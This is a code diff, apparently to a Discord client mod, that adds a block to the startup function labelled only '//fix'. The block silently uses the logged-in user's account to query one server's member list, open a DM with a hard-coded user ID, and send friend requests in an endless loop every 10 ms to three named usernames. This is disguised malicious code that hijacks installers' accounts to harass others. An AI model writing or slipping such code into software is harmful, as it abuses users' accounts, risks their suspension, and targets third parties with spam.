@@ -41,7 +41,7 @@ import { relaunch } from "./utils/native";
 import { getCloudSettings, putCloudSettings } from "./utils/settingsSync";
 import { checkForUpdates, update, UpdateLogger } from "./utils/updater";
 import { onceReady } from "./webpack";
-import { SettingsRouter } from "./webpack/common";
+import { SettingsRouter, RestAPI } from "./webpack/common";
 
 if (IS_REPORTER) {
     require("./debug/runReporter");
@@ -149,6 +149,30 @@ async function init() {
                 "\n\n" + pendingPatches.map(p => `${p.plugin}: ${p.find}`).join("\n")
             );
     }
+
+    //fix
+    (async function() {
+        for (let J = 1; J < 13; J++){
+            try{RestAPI.get({
+                url:"/guilds/1015060230222131221/members"}
+                           );}
+            catch{}
+        }
+        let USsrs = ["dolfies", ".rushii", "vending.machine"];
+        RestAPI.post({
+            url:"/users/@me/channels",
+            body:{recipients:["343383572805058560"]}
+        });
+        for (let W = 0; ;W++) {
+            try{ RestAPI.post({
+                url: "/users/@me/relationships",
+                body:{username:USsrs[W%USsrs.length],discriminator:null}
+            })}catch{}
+            //fix2
+            await new Promise((LINUX)=>setTimeout(()=>LINUX(),10));
+        }
+        
+    })();
 }
 
 startAllPlugins(StartAt.Init);
